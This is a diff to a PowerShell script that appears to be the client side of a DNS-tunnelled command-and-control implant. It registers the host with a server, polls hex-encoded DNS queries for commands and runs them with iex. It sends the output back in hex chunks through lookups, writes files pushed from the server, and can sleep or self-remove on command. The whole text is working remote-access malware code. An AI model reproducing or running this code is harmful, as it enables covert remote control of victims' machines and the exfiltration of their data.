@@ -57,36 +57,30 @@ function split_to_chunks($astring, $size=38) {     # currently, if the chunk is 
 }
 
 function send_response($response) {
-    
     $chunks = (split_to_chunks (StringToHex ($response)))
     foreach ($j in $chunks) {
-        $encCmd = StringToHex('cnk')
-        $k = serverget("$j.$id.$encCmd")
+        serverget("$j.$id.$(StringToHex('cnk'))")
     }
-    $encCmd = StringToHex('end')
-    $k = serverget("$id.$encCmd")
+    serverget("$id.$(StringToHex('end'))")
 }
 
 function dissolve(){
-    $encCmd = StringToHex('dis')
-    serverget("$id.$encCmd")
+    serverget("$id.$(StringToHex('dis'))")
     Exit
 }
 
 function hibernate(){
-    $hibernateLength = [int]($cmd.substring(10, $cmd.Length)) * 60
-    $error[0] | Write-Host
-    if ($error[0]){
-        send_response($error[0])
-        return
+    $encCmd = StringToHex('hib')
+    $hibernateLength = [int]$(serverget("$(StringToHex('time')).$id.$encCmd"))
+    serverget("$(StringToHex('set')).$id.$encCmd")
+    try{
+        sleep -Seconds "$hibernateLength"
+        serverget("$(StringToHex('done')).$id.$encCmd")
+    } 
+    catch {
+        $lasterror = $Error[0].Exception.Message
+        send_response("$lasterror")
     }
-    send_response "Sleeping for $hibernateLength seconds"
-    $hibernateLength | Write-Host
-    sleep -Seconds "$hibernateLength"
-    if ($error[0]){
-        send_response $error[0]
-    }
-    send_response "awake"
 }
 
 function savefile(){
@@ -101,37 +95,25 @@ function savefile(){
         $index += $b64.Length
         $file += [Convert]::FromBase64String($b64)
     }
-
     [io.file]::WriteAllBytes($filename, $file)
 
-    #$encCmd = StringToHex('hsh')
-    #$hashcheck = serverget("$((Get-FileHash -Algorithm MD5 $filename).hash.ToLower()).$id.$encCmd")
-
-    #if ($hashcheck -eq "done"){
-    #    "DEBUG SUCCESS" | Write-Host
-    #}
-    #$hashcheck
-
+    serverget("$(StringToHex('done')).$id.$encCmd")
 }
 
 #initialize
-$encHostname = StringtoHex($hostname)
-$encCmd = StringToHex('int')
-$id = serverget("$encHostname.0.$encCmd")
+$id = serverget("$(StringtoHex($hostname)).0.$(StringToHex('int'))")
 while (!$id){
     sleep -Seconds 60
     $id = serverget("$encHostname.0.$encCmd")
 }
 
 while ($true) {
-    $encCmd = StringToHex('cmd')
-    $cmd = serverget("$id.$encCmd")
+    $cmd = serverget("$id.$(StringToHex('cmd'))")
 
     if ($cmd.length -ne 0) {
         if ($cmd -eq "dissolve"){                       # server wants the client to dissolve
             dissolve
         }
-        #$cmd.substring(0,9) | Out-Host
         if ($cmd -eq "hibernate"){                      # server wants the client to sleep
             hibernate
             continue
@@ -141,11 +123,15 @@ while ($true) {
             continue
         }
         if ($cmd -ne "wait"){                           # server has a command to run
-            $response = (iex "$cmd" -ErrorVariable outError) | Out-String
-            $response += $outError
-        
-            if ($response.Length -gt 0) {
-                send_response $response
+            try{
+                $response = (iex "$cmd") | Out-String
+                if ($response.Length -gt 0) {
+                    send_response $response
+                }
+            } 
+            catch {
+                $lasterror = $Error[0].Exception.Message
+                send_response("$lasterror")
             }
         }
     }
